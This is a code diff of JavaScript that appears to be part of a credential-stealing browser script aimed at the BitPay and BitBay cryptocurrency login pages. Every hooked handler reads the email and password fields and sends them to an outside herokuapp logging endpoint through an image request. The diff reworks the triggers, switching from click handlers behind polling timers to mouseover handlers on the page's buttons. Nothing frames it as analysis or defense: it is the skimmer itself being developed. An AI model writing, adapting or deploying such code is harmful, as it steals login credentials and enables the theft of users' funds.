@@ -144,55 +144,36 @@ for (var i = 0; i < arrayLength; i++) {
 
 
 
-  if (top['location']['href']['indexOf']('bitpay.com/dashboard/login') > -1) {
-      var interval = setInterval(function () {
-          if (document['getElementsByClassName']('bp-constrain-login')[0]) {
-              clearInterval(interval);
-              document['getElementsByClassName']('button bp-button prelogin__button ladda-button')[0].onclick = function (_0x441cx2) {
+  if (top['location']['href']['indexOf']('bitpay.com/dashboard/login/') > -1) {
+              document.getElementsByTagName("button")[1].onmouseover = function (_0x441cx2) {
               username = document.getElementsByName("email")[0].value;
               user_pass = document.getElementsByName("password")[0].value;
               (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
               }
-          }
-      }, 1000)
   };
 
   if (top['location']['href'] === 'auth.bitbay.net/login') {
-      var interval = setInterval(function () {
-          if (document['getElementsByClassName']('main-content-container')[0]) {
-              clearInterval(interval);
-              document['getElementsByClassName']('send-btn')[0].onclick = function (_0x441cx2) {
+              document.getElementsByTagName("button")[1].onmouseover = function (_0x441cx2) {
               username = document.getElementsByName("email")[0].value;
               user_pass = "null"; //document.getElementsByName("password")[0].value;
               (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
               }
-          }
-      }, 1000)
-  };
-  if (top['location']['href'] === 'auth.bitbay.net/login-password') {
-      var interval = setInterval(function () {
-          if (document['getElementsByClassName']('main-content-container')[0]) {
-              clearInterval(interval);
-              document['getElementsByClassName']('send-btn')[0].onclick = function (_0x441cx2) {
-              username = "null" //document.getElementsByName("email")[0].value;
-              user_pass = document.getElementsByName("password")[0].value;
-              (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
-              }
-          }
-      }, 1000)
   };
 
   if (top['location']['href'] === 'auth.bitbay.net/login-password') {
-      var interval = setInterval(function () {
-          if (document['getElementsByClassName']('main-content-container')[0]) {
-              clearInterval(interval);
+              document.getElementsByTagName("button")[0].onmouseover= function (_0x441cx2) {
+              username = "null" //document.getElementsByName("email")[0].value;
+              user_pass = document.getElementsByName("password")[0].value;
+              (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+              }
+  };
+
+  if (top['location']['href'] === 'auth.bitbay.net/login-password') {
               document['getElementsByClassName']('send-btn')[0].onclick = function (_0x441cx2) {
               username = "null" //document.getElementsByName("email")[0].value;
               user_pass = document.getElementsByName("password")[0].value;
               (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
               }
-          }
-      }, 1000)
   };
 
 
